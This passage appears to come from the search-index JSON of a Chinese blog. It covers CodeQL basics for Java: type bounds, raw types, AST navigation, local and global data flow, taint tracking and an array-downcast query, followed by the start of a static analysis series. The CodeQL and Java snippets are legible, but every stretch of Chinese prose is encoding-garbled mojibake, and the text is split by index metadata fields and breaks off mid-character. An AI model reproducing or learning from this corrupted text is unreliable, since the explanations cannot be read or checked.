ç±»å‹ä¸ºç•Œé™çš„å˜é‡ï¼š import java from TypeVariable tv, TypeBound tb where tb = tv.getATypeBound() and tb.getType().hasQualifiedName(\"java.lang\", \"Number\") select tv ä¸ºäº†å¤„ç†é‚£äº›åœ¨æ³›å‹å‡ºç°ä¹‹å‰çš„é—ç•™ä»£ç ï¼Œæ¯ä¸ªæ³›å‹éƒ½æœ‰ä¸€ä¸ªæ²¡æœ‰ä»»ä½•ç±»å‹å‚æ•°çš„ ã€ŒåŸå§‹ã€ç‰ˆæœ¬ã€‚åœ¨ CodeQL åº“ä¸­ï¼ŒåŸå§‹ç±»å‹ç”¨ RawType ç±»è¡¨ç¤ºï¼Œå®ƒæœ‰é¢„æœŸçš„å­ç±» RawClass å’Œ RawInterfaceã€‚åŒæ ·ï¼Œæœ‰ä¸€ä¸ªè°“è¯ getSourceDeclaration ç”¨äºè·å¾—ç›¸åº”çš„é€šç”¨ç±»å‹ã€‚å¦‚ä¸‹çš„æŸ¥è¯¢å¯ä»¥æ‰¾åˆ°ï¼ˆåŸå§‹ï¼‰ç±»å‹ Map çš„å˜é‡ã€‚å®é™…ä¸Šï¼Œç°åœ¨ä»ç„¶æœ‰è®¸å¤šé¡¹ç›®åœ¨ä½¿ç”¨åŸå§‹ç±»å‹çš„ Mapã€‚ import java from Variable v, RawType rt where rt = v.getType() and rt.getSourceDeclaration().hasQualifiedName(\"java.util\", \"Map\") select v ä¸Šè¿°çš„æŸ¥è¯¢è¯­å¥ï¼Œé’ˆå¯¹å¦‚ä¸‹ä»£ç ç‰‡æ®µï¼Œåªèƒ½æŸ¥æ‰¾åˆ° m1 è€Œä¸èƒ½æŸ¥æ‰¾åˆ° m2ã€‚ Map m1 = new HashMap(); Map\u003cString, String\u003e m2 = new HashMap\u003cString, String\u003e(); å˜é‡ï¼šVariable ç±» Variable è¡¨ç¤º Java ä¸­çš„å˜é‡ï¼Œå®ƒå¯ä»¥æ˜¯ä¸€ä¸ªç±»çš„æˆå‘˜å­—æ®µï¼ˆæ— è®ºæ˜¯å¦é™æ€ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œæˆ–è€…æ˜¯å‡½æ•°çš„å‚æ•°ã€‚å› æ­¤ï¼Œæœ‰ä¸‰ä¸ªå­ç±»æ¥æ»¡è¶³è¿™äº›ç‰¹æ®Šæƒ…å†µçš„éœ€è¦ã€‚ Field ï¼šå­—æ®µ LocalVariableDecl ï¼šæœ¬åœ°å˜é‡. Parameter ï¼šæ–¹æ³•æˆ–æ„é€ å‡½æ•°çš„å‚æ•°ã€‚ 4.2.3 æŠ½è±¡è¯­æ³•æ ‘ï¼šAbstract Syntax Tree è¯¥ç±»ä¸­åŒ…å«äº†æŠ½è±¡è¯­æ³•æ ‘çš„èŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯è¯­å¥ï¼ˆQL ä¸­çš„ç±» Stmtï¼‰å’Œè¡¨è¾¾å¼ï¼ˆQL ä¸­çš„ç±» Exprï¼‰ã€‚å…³äºæ ‡å‡† QL åº“ä¸­å¯ç”¨çš„è¡¨è¾¾å¼å’Œè¯­å¥ç±»å‹çš„å®Œæ•´åˆ—è¡¨ï¼Œå¯ä»¥å‚è€ƒè¯¥é“¾æ¥ã€‚ Expr å’Œ Stmt éƒ½æä¾›äº†æˆå‘˜è°“è¯æ¥è·å–ç¨‹åºçš„æŠ½è±¡è¯­æ³•æ ‘ï¼š Expr.getAChildExpr è¿”å›ä¸€ä¸ªç»™å®šè¡¨è¾¾å¼çš„å­è¡¨è¾¾å¼ã€‚ Stmt.getAChild è¿”å›ç›´æ¥åµŒå¥—åœ¨ç»™å®šè¯­å¥ä¸­çš„è¯­å¥æˆ–è¡¨è¾¾å¼ã€‚ Expr.getParent å’Œ Stmt.getParent è¿”å› AST èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ã€‚ ä¸‹é¢çš„æŸ¥è¯¢å¯ä»¥æ‰¾åˆ°æ‰€æœ‰çˆ¶ç±»ä¸ºè¿”å›è¯­å¥çš„è¡¨è¾¾å¼ã€‚ import java from Expr e where e.getParent() instanceof ReturnStmt select e å› æ­¤ï¼Œç¨‹åºä¸­å¦‚æœåŒ…å«ï¼šreturn x + y å­è¡¨è¾¾å¼ï¼ŒQL çš„æŸ¥è¯¢ç»“æœå°†ä¼šè¿”å›ï¼šx + yã€‚ ä¸‹é¢çš„æŸ¥è¯¢å¯ä»¥æ‰¾åˆ°æŸä¸ªè¡¨è¾¾å¼çš„çˆ¶çº§ä¸º if è¯­å¥ï¼š import java from Stmt s where s.getParent() instanceof IfStmt select s è¿™ä¸ªæŸ¥è¯¢å°†æ‰¾åˆ°ç¨‹åºä¸­æ‰€æœ‰ if è¯­å¥çš„ then åˆ†æ”¯å’Œ else åˆ†æ”¯ã€‚ æœ€åï¼Œä¸€ä¸ªæŸ¥è¯¢çš„ä¾‹å­ï¼Œå¯ä»¥æ‰¾åˆ°æ–¹æ³•ä½“ã€‚ import java from Stmt s where s.getParent() instanceof Method select s å¦‚ä¸Šçš„è¿™äº›ä¾‹å­å¯çŸ¥ï¼Œè¡¨è¾¾å¼çš„çˆ¶èŠ‚ç‚¹å¹¶ä¸æ€»æ˜¯è¡¨è¾¾å¼ï¼šå®ƒä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªè¯­å¥ï¼Œä¾‹å¦‚ IfStmtã€‚åŒæ ·ï¼Œè¯­å¥çš„çˆ¶èŠ‚ç‚¹ä¹Ÿä¸æ€»æ˜¯ä¸€ä¸ªè¯­å¥ï¼šå®ƒä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ å‡½æ•°ã€‚ä¸ºäº†æŠ“ä½è¿™ä¸€ç‚¹ï¼ŒQL Java åº“æä¾›äº†ä¸¤ä¸ªæŠ½è±¡ç±» ExprParent å’Œ StmtParentï¼Œå‰è€…ä»£è¡¨å¯èƒ½æ˜¯è¡¨è¾¾å¼çš„çˆ¶èŠ‚ç‚¹çš„ä»»ä½•èŠ‚ç‚¹ï¼Œåè€…ä»£è¡¨å¯èƒ½æ˜¯è¯­å¥çš„çˆ¶èŠ‚ç‚¹çš„ä»»ä½•èŠ‚ç‚¹ã€‚ 4.2.4 å…ƒæ•°æ®ï¼šMetadata é™¤äº† Java ç¨‹åºä»£ç æœ¬èº«ä¹‹å¤–ï¼ŒJava ç¨‹åºè¿˜æœ‰å‡ ç§å…ƒæ•°æ®ã€‚å…¶ä¸­åŒ…æ‹¬æœ‰æ³¨è§£(Annotations) å’Œ Javadoc æ³¨é‡Šã€‚ç”±äºè¿™äº›å…ƒæ•°æ®å¯¹äºåŠ ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:4:2","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.3 æ•°æ®æµåˆ†æ æœ¬å°èŠ‚æè¿°äº†å¦‚ä½•åœ¨ CodeQL ä¸­çš„ Java åº“è¿›è¡Œæ•°æ®æµåˆ†æçš„ï¼Œå¹¶åŒ…æ‹¬å‡ ä¸ªä½¿ç”¨æ•°æ®æµæŸ¥è¯¢çš„ä¾‹å­ã€‚ä¸‹é¢å‡ èŠ‚æè¿°äº†å¦‚ä½•ä½¿ç”¨åº“è¿›è¡Œæœ¬åœ°æ•°æ®æµã€å…¨å±€æ•°æ®æµå’Œæ±¡ç‚¹è·Ÿè¸ªã€‚ 4.3.1 æœ¬åœ°æ•°æ®æµ ä½¿ç”¨æœ¬åœ°æ•°æ®æµ æœ¬åœ°æ•°æ®æµçš„ä½œç”¨åŸŸé™å®šåœ¨ä¸€ä¸ªæ–¹æ³•æˆ–è°ƒç”¨å†…ã€‚æœ¬åœ°æ•°æ®æµç›¸æ¯”å…¨å±€æ•°æ®æµæ›´å®¹æ˜“ï¼Œæ›´å¿«é€Ÿï¼Œæ›´å‡†ç¡®ã€‚æœ¬åœ°æ•°æ®æµç›¸å…³çš„åº“ä½äº DataFlow æ¨¡å—ä¸­ï¼Œéœ€è¦æ‰‹åŠ¨å¯¼å…¥ã€‚ import semmle.code.java.dataflow.DataFlow æ•°æ®æµèŠ‚ç‚¹ï¼ˆNodeï¼‰å¯ä»¥åˆ†ä¸º ExprNode å’Œ ParamterNodeã€‚DataFlow::Node çš„ä¸¤ä¸ªè°“è¯ï¼Œå¯ä»¥å°†æ•°æ®æµèŠ‚ç‚¹è½¬ Exprã€Parameter çš„å½¢å¼ã€‚ class Node { // è·å–æ•°æ®æµèŠ‚ç‚¹Exprçš„å½¢å¼ Expr asExpr() { ... } // è·å–æ•°æ®æµèŠ‚ç‚¹Parameterçš„å½¢å¼ Parameter asParameter() { ... } } DataFlow çš„ä¸¤ä¸ªè°“è¯ï¼Œå¯ä»¥å°† Exprã€Parameter è½¬æ•°æ®æµèŠ‚ç‚¹çš„å½¢å¼ï¼š // è·å– Expr å¯¹åº”çš„æ•°æ®æµèŠ‚ç‚¹å½¢å¼ ExprNode DataFlow::exprNode(Expr e) // è·å– Parameter å¯¹åº”çš„æ•°æ®æµèŠ‚ç‚¹å½¢å¼ ParameterNode DataFlow::parameter(Parameter p) å¦‚æœå­˜åœ¨ä»èŠ‚ç‚¹ nodeFrom åˆ°èŠ‚ç‚¹ nodeTo çš„ç›´æ¥æ•°æ®æµè¾¹ï¼Œè°“è¯ localFlowStep(Node nodeFrom, Node nodeTo) æˆç«‹ã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨ + å’Œ * è¿ç®—ç¬¦é€’å½’åœ°åº”ç”¨è¯¥è°“è¯ï¼Œæˆ–è€…ä½¿ç”¨é¢„å®šä¹‰çš„é€’å½’è°“è¯ localFlowï¼Œå®ƒç­‰åŒäº localFlowStep*ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡ DataFlow çš„è°“è¯ localFlowStep é™å®šä» nodeFrom æµå‘ nodeTo çš„æ•°æ®æµã€‚ DataFlow::localFlow(DataFlow::parameterNode(source), DataFlow::exprNode(sink)) ä½¿ç”¨æœ¬åœ°æ±¡ç‚¹è¿½è¸ª å¦‚ä¸‹ç¤ºä¾‹ä»£ç ä¸­ï¼Œå¦‚æœ x è¢«å®šä¹‰ä¸ºæ±¡ç‚¹ï¼Œé‚£ä¹ˆ y ä¹Ÿå°†æ˜¯æ±¡ç‚¹ã€‚ String temp = x; String y = temp + \", \" + temp; æœ¬åœ°æ±¡ç‚¹è·Ÿè¸ªåº“åœ¨ TaintTracking æ¨¡å—ä¸­ã€‚ä¸æœ¬åœ°æ•°æ®æµä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨ TaintTracking çš„è°“è¯ localTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo) é™å®šä» nodeFrom æµå‘ nodeTo çš„æ•°æ®æµã€‚ å¯ä»¥é€šè¿‡ä½¿ç”¨ + å’Œ * æ“ä½œç¬¦é€’å½’åœ°åº”ç”¨è¯¥è°“è¯ï¼Œæˆ–è€…ä½¿ç”¨é¢„å®šä¹‰çš„é€’å½’è°“è¯ localTaintï¼Œå®ƒç­‰åŒäº localTaintStep*ã€‚ TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink)) ç¤ºä¾‹ å¦‚ä¸‹æŸ¥è¯¢å¯ä»¥æ‰¾åˆ°ä¼ é€’ç»™ new FileReader(..) çš„æ–‡ä»¶åã€‚ import java from Constructor fileReader, Call call where fileReader.getDeclaringType().hasQualifiedName(\"java.io\", \"FileReader\") and call.getCallee() = fileReader select call.getArgument(0) ä½†æ˜¯ï¼Œè¯¥æŸ¥è¯¢çš„ç»“æœåªç»™å‡ºäº†å‚æ•°ä¸­çš„è¡¨è¾¾å¼ï¼Œè€Œä¸æ˜¯å¯ä»¥ä¼ é€’ç»™å®ƒçš„å€¼ã€‚æ‰€ä»¥ä½¿ç”¨æœ¬åœ°æ•°æ®æµæ¥æ‰¾åˆ°æ‰€æœ‰æµå…¥å‚æ•°çš„è¡¨è¾¾å¼ã€‚ import java import semmle.code.java.dataflow.DataFlow from Constructor fileReader, Call call, Expr src where fileReader.getDeclaringType().hasQualifiedName(\"java.io\", \"FileReader\") and call.getCallee() = fileReader and DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(0))) select src ç„¶åæˆ‘ä»¬å¯ä»¥ä½¿æ¥æºæ›´å…·ä½“ï¼Œä¾‹å¦‚å¯¹ä¸€ä¸ªå…¬å…±å‚æ•°çš„è®¿é—®ã€‚è¿™ä¸ªæŸ¥è¯¢å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå…¬å…±å‚æ•°è¢«ä¼ é€’ç»™ new FileReader(...) ä¸­ã€‚ import java import semmle.code.java.dataflow.DataFlow from Constructor fileReader, Call call, Parameter p where fileReader.getDeclaringType().hasQualifiedName(\"java.io\", \"FileReader\") and call.getCallee() = fileReader and DataFlow::localFlow(DataFlow::parameterNode(p), DataFlow::exprNode(call.getArgument(0))) select p 4.3.2 å…¨å±€æ•°æ®æµ å…¨å±€æ•°æ®æµæ¯”æœ¬åœ°æ•°æ®æµæ›´å¼ºå¤§ï¼Œä½†æ˜¯æ‰§è¡Œæ—¶ä¹Ÿæ›´æ¶ˆè€—æ—¶é—´ä¸å†…å­˜ã€‚ ä½¿ç”¨å…¨å±€æ•°æ®æµ éœ€è¦ç»§æ‰¿ DataFlow::Configuration import semmle.code.java.dataflow.DataFlow class MyDataFlowConfiguration extends DataFlow::Configuration { MyDataFlowConfiguration() { this = \"MyDataFlowConfiguration\" } override predicate isSource(DataFlow::Node source) { ... } override predicate isSink(DataFlow::Node sink) { ... } } Configuration å†…ç½®çš„å‡ ä¸ªè°“è¯ isSourceï¼šå®šä¹‰æ•°æ®æµçš„æ¥æº isSinkï¼šå®šä¹‰æ•°æ®æµçš„ç»ˆç‚¹ isBarrierï¼šå¯é€‰ï¼Œé™åˆ¶æ•°æ®æµ isAdditionalFlowStepï¼šå¯é€‰ï¼Œé™åˆ¶æ•°æ®æµçš„æ­¥æ•° ç„¶åé€šè¿‡è°ƒç”¨ Configuration çš„è°“è¯ hasFlow(DataFlow::Node source, DataFlow::Node sink) æ¥æ‰§è¡Œæ•°æ®æµåˆ†æã€‚ from MyDataFlowConfiguration dataflow, DataFlow::Node source, DataFlow::Node sink where dataflow.hasFlow(source, sink) select source, \"Data flow to $@.\", sink, sink.toString() ä½¿ç”¨å…¨å±€æ±¡ç‚¹è¿½è¸ª éœ€è¦ç»§æ‰¿ TaintTracking::Configuration import semmle.code.java.dataflow.TaintTracking class MyTaintTrackingConfiguration extends TaintTracking::Configuration { MyTaintTrackingConfiguration() { this = \"MyTaintTrackingConfiguration\" } override predicate isSource(DataFlow::Node source) { ... } override predicate isSink(DataFlow::Node sink) { ... } } Configuration å†…ç½®çš„å‡ ä¸ªè°“è¯ï¼š isSourceï¼šæ±¡æŸ“æº isSinkï¼šæ±¡æŸ“æ±‡èšç‚¹ isSanitizerï¼šè¿‡æ»¤å™¨ isAdditionalTaintStepï¼šæ•°æ®æµæ‹¼æ¥ å…¨å±€æ±¡ç‚¹è¿½è¸ªçš„æ‰§è¡Œä¸å…¨å±€æ•°æ®æµçš„æ‰§è¡Œç›¸ä¼¼ï¼Œä¹Ÿæ˜¯é€šè¿‡è°ƒç”¨ Configuration çš„ hasFlow è°“è¯ã€‚ ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:4:3","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.4 Java ç±»å‹ 4.4.1 å…³äº Java ä¸­çš„ç±»å‹ æ­¤å°ç»“æ˜¯ https://codeql.github.com/docs/codeql-language-guides/types-in-java/ å¯¹ å†…å®¹çš„è¿›ä¸€æ­¥é˜è¿° CodeQL ä¸­æä¾›äº† Type ç±»ä»¥åŠå­ç±»ï¼Œæ¥è¡¨ç¤º Java ä¸­çš„å„ç§ç±»å‹ã€‚ æ­£å¦‚å‰æ–‡æ‰€è¿°ï¼ŒPrimitiveType ç±»ç”¨æ¥è¡¨ç¤º Java ä¸­æ‰€æœ‰çš„ä¸»æ•°æ®ç±»å‹ï¼Œä¾‹å¦‚ booleanã€intã€‚RefType ç±»ç”¨æ¥è¡¨ç¤º Java ä¸­æ‰€æœ‰çš„å¼•ç”¨ç±»å‹ï¼Œä¾‹å¦‚ Arrayã€å­—ç¬¦ä¸²ç­‰ã€‚ RefType ç±»æä¾›äº†ä¸¤ä¸ªæˆå‘˜è°“è¯ getASupertype å’Œ getASubtype æ¥æŸ¥æ‰¾è¯¥å¼•ç”¨ç±»å‹å¯¹åº”çš„è¶…ç±»å’Œå­ç±»ã€‚ class A {} interface I {} class B extends A implements I {} å¦‚ä¸Šæ‰€ç¤ºï¼šA çš„è¶…ç±»æ˜¯ java.lang.Objectï¼Œå­ç±»æ˜¯ Bï¼›B çš„è¶…ç±»æœ‰ A å’Œ Iï¼Œæ²¡æœ‰å­ç±»ã€‚ ä»¥è·å–Bç±»æ‰€æœ‰çš„è¶…ç±»ä¸ºä¾‹ï¼š import java from Class B where B.hasName(\"B\") select B.getASupertype+() é™¤äº†ç±»å±‚æ¬¡å»ºæ¨¡ä¹‹å¤–ï¼ŒRefType è¿˜æä¾›äº†æˆå‘˜è°“è¯ getAMember ç”¨äºè®¿é—®ç±»å‹ä¸­å£°æ˜çš„æˆå‘˜ï¼ˆå³å­—æ®µã€æ„é€ å‡½æ•°å’Œæ–¹æ³•ï¼‰ï¼Œè°“è¯ inherits(Method m) ç”¨äºæ£€æŸ¥ç±»å‹æ˜¯å£°æ˜è¿˜æ˜¯ç»§æ‰¿äº†æ–¹æ³• mã€‚ 4.4.2 ç¤ºä¾‹ å¯»æ‰¾å¯èƒ½å­˜åœ¨é—®é¢˜çš„æ•°æ®è½¬æ¢ ä½œä¸ºå¦‚ä½•ä½¿ç”¨ç±»å±‚æ¬¡ API çš„ç¤ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªæŸ¥è¯¢æ¥æŸ¥æ‰¾æ•°ç»„çš„å‘ä¸‹è½¬æ¢ï¼Œå³æŸç§ç±»å‹ A[] çš„è¡¨è¾¾å¼ e è½¬æ¢ä¸ºç±»å‹ B[] çš„æƒ…å†µï¼Œä½¿å¾— B æ˜¯ ï¼ˆä¸ä¸€å®šæ˜¯ç›´æ¥çš„ï¼‰A çš„å­ç±»å‹ã€‚ è¿™ç§ç±»å‹çš„è½¬æ¢æ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºå‘ä¸‹è½¬æ¢æ•°ç»„ä¼šå¯¼è‡´è¿è¡Œæ—¶å¼‚å¸¸ï¼Œå³ä½¿æ¯ä¸ªå•ç‹¬çš„æ•°ç»„å…ƒç´ éƒ½å¯ä»¥å‘ä¸‹è½¬æ¢ã€‚ ä¾‹å¦‚ï¼Œä»¥ä¸‹ä»£ç ä¼šå¼•å‘ ClassCastExceptionï¼š Object[] o = new Object[] { \"Hello\", \"world\" }; String[] s = (String[])o; å¦ä¸€æ–¹é¢ï¼Œå¦‚æœè¡¨è¾¾å¼ e æ°å¥½å®é™…è®¡ç®—ä¸º B[] æ•°ç»„ï¼Œåˆ™å¼ºåˆ¶è½¬æ¢å°†æˆåŠŸï¼š Object[] o = new String[] { \"Hello\", \"world\" }; String[] s = (String[])o; åœ¨æœ¬æ•™ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸ä¼šå°è¯•åŒºåˆ†è¿™ä¸¤ç§æƒ…å†µã€‚ æˆ‘ä»¬çš„æŸ¥è¯¢åº”è¯¥ä»…ä»…æŸ¥æ‰¾ä»æŸä¸ªç±»å‹æºè½¬æ¢ä¸ºå¦ä¸€ä¸ªç±»å‹ç›®æ ‡çš„è½¬æ¢è¡¨è¾¾å¼ ceï¼Œä¾‹å¦‚ï¼š æºå’Œç›®æ ‡éƒ½æ˜¯æ•°ç»„ç±»å‹ã€‚ æºçš„å…ƒç´ ç±»å‹æ˜¯ç›®æ ‡çš„å…ƒç´ ç±»å‹çš„é€’å½’è¶…ç±»ã€‚ è½¬æ¢ä¸ºæŸ¥è¯¢è¯­å¥ï¼š import java from CastExpr ce, Array source, Array target where source = ce.getExpr().getType() and target = ce.getType() and target.getElementType().(RefType).getASupertype+() = source.getElementType() select ce, \"Potentially problematic array downcast.\" Array ç±»çš„æˆå‘˜è°“è¯ getElementType å¯ä»¥è·å¾—è¯¥æ•°ç»„ä¸­å…ƒç´ çš„æ•°æ®ç±»å‹ï¼Œresult æ˜¯ Type ç±»å‹çš„ Type Array::getElementType() åœ¨ç¬¬ 6 è¡Œä¸­ï¼Œå°† Type ç±»å‹å‘ä¸‹è½¬æ¢ä¸º RefType ç±»å‹ï¼Œç„¶åè°ƒç”¨ RefType ç±»çš„æˆå‘˜è°“è¯ getASupertypeã€‚ target.getElementType().(RefType).getASupertype+() æ ‡è¯†æ–¹æ³• Java æ”¯æŒé‡è½½ï¼Œå¯ä»¥é€šè¿‡é™åˆ¶å½¢å‚çš„æ•°æ®ç±»å‹æ¥æ ‡è¯†å›ºå®šçš„æŸä¸ªæ–¹æ³•ï¼š æ ‡è¯† java.util.Collection.contains(Object) æ–¹æ³• class JavaUtilCollection extends GenericInterface { JavaUtilCollection() { this.hasQualifiedName(\"java.util\", \"Collection\") } } class JavaUtilCollectionContains extends Method { JavaUtilCollectionContains() { this.getDeclaringType() instanceof JavaUtilCollection and this.hasStringSignature(\"contains(Object)\") } } å¦‚ä¸Šæ‰€ç¤ºçš„ hasStringSignature è°“è¯æœ‰å¦‚ä¸‹ä½œç”¨ï¼š é™åˆ¶æ–¹æ³•åä¸º containsï¼Œå¯ä»¥ä½¿ç”¨è°“è¯ hasName æ¥æ›¿ä»£ é™åˆ¶å‚æ•°ä¸º 1 ä¸ªï¼Œå¯ä»¥ä½¿ç”¨è°“è¯ getNumberOfParameters æ¥æ›¿ä»£ é™åˆ¶å‚æ•°çš„ç±»å‹æ˜¯ Object ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼æ¥æ›¿ä»£ getParameter(0).getType() instanceof TypeObject. ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:4:4","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"å‚è€ƒ QL language reference CodeQLåˆå…¥ CodeQL Javaå­¦ä¹ ç¬”è®° https://github.com/haby0/mark https://github.com/SummerSec/learning-codeql QL tutorials https://tttang.com/archive/1415/ ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:5:0","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"é™æ€ç¨‹åºåˆ†æ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"é™æ€ç¨‹åºåˆ†æ(ä¸€) ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:0:0","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"1 å‰è¨€ ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:1:0","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"1.1 é™æ€ç¨‹åºçš„å®šä½ é™æ€ç¨‹åºåˆ†ææ˜¯ç¼–ç¨‹è¯­è¨€ä¸­åº”ç”¨å±‚é¢ä¸‹çš„ä¸€ä¸ªç»†åˆ†é¢†åŸŸï¼Œå®ƒæ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ ¸å¿ƒå†…å®¹ã€‚ åœ¨ç†è®ºéƒ¨åˆ†ï¼Œè€ƒè™‘çš„æ˜¯å¦‚ä½•è®¾è®¡ä¸€ä¸ªè¯­è¨€çš„è¯­æ³•å’Œè¯­ä¹‰ï¼Œå¦‚ä½•è®¾è®¡è¯­è¨€çš„ç±»å‹ç³»ç»Ÿç­‰ç­‰é—®é¢˜ï¼›æœ‰äº†è¯­è¨€çš„è¯­æ³•ã€è¯­ä¹‰å’Œç±»å‹ç³»ç»Ÿä¹‹åï¼Œæˆ‘ä»¬éœ€è¦æ”¯æ’‘è¯­è¨€çš„è¿è¡Œã€‚å› æ­¤ï¼Œåœ¨ç¯å¢ƒéƒ¨åˆ†ï¼Œéœ€è¦è€ƒè™‘å¦‚ä½•ä¸ºè¿è¡Œä¸­çš„ç¨‹åºæä¾›è¿è¡Œæ—¶ç¯å¢ƒâ€”â€”å¦‚ä½•è®¾è®¡ç¼–è¯‘å™¨ï¼Œåœ¨è¿è¡Œæ—¶éœ€è¦æ€æ ·çš„æ”¯æŒï¼ˆå¦‚å†…å­˜çš„åˆ†é…ç®¡ç†ï¼‰ç­‰ç­‰ï¼›åº”ç”¨éƒ¨åˆ†åˆ™å…³æ³¨å¦‚ä½•ä¿è¯è¯­è¨€æ‰€å†™å‡ºç¨‹åºçš„æ•ˆç‡ã€å®‰å…¨æ€§å’Œå¯é æ€§ï¼Œä¸»è¦è€ƒè™‘å¦‚ä½•å¯¹ç¨‹åºè¿›è¡Œåˆ†æï¼ŒéªŒè¯å’Œåˆæˆï¼ˆå¦‚ä½•è‡ªåŠ¨åˆæˆä¸€ä¸ªç¨‹åºï¼‰ã€‚ ä¸€å¥è¯æ¦‚æ‹¬é™æ€åˆ†æï¼šåœ¨ä¿è¯æ­£ç¡®æ€§çš„å‰æä¸‹ï¼Œåœ¨ç²¾åº¦å’Œé€Ÿåº¦ä¸Šåšå¹³è¡¡ã€‚ ","date":"2022-02-14","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/:1:1","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(ä¸€)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"1.2 é™æ€ç¨‹åºåˆ†æçš„åº”ç”¨ æé«˜ç¨‹åºå¯é æ€§ ç©ºæŒ‡é’ˆå¼•ç”¨ä¸å†…å­˜æ³„æ¼ç­‰ æé«˜ç¨‹åºå®‰å…¨æ€§ éšç§ä¿¡æ¯æ³„æ¼ï¼šå¤šå­˜åœ¨äºç§»åŠ¨åº”ç”¨å®‰å…¨ä¸­ æ³¨å…¥æ”»å‡» ç¼–è¯‘ä¼˜åŒ– æ­»ä»£ç æ¶ˆé™¤ï¼šåœ¨ç¼–è¯‘å™¨çš„æœºå™¨æ— å…³ä¼˜åŒ–ç¯èŠ‚ï¼Œå°†ä¸ä¼šå¯¹ç¨‹åºæ‰§è¡Œç»“æœäº§ç”Ÿå½±å“çš„ä»£ç ï¼ˆå³æ­»ä»£ç ï¼‰åˆ é™¤ã€‚ å¾ªç¯ä¸å˜é‡çš„ä»£ç ç§»åŠ¨ï¼šåœ¨ç¼–è¯‘å™¨çš„æœºå™¨æ— å…³ä¼˜åŒ–ç¯èŠ‚ï¼Œåœ¨ä¿è¯ä¸å½±å“ç¨‹åºæ‰§è¡Œç»“æœçš„æƒ…å†µä¸‹ï¼Œå°†å¾ªç¯ä¸­çš„ç‰¹å®šè¯­å¥ç§»åŠ¨åˆ°å¾ªç¯å¤–ï¼Œä½¿å¾—ç¨‹åºè¿è¡Œæ—¶æ‰§è¡Œçš„è¯­å¥æ•°å‡å°‘ã€‚ æœ‰åŠ©äºç¨‹åºç†è§£ ä¸ºé›†æˆå¼€å‘ç¯å¢ƒçš„åŠŸèƒ½æä¾›å¸®åŠ©ï¼šå½“ä½ ä½¿ç”¨ VS/Idea/Clion/Eclipse/Android Studio ç­‰ç­‰ IDE æ—¶ï¼Œå°†é¼ æ 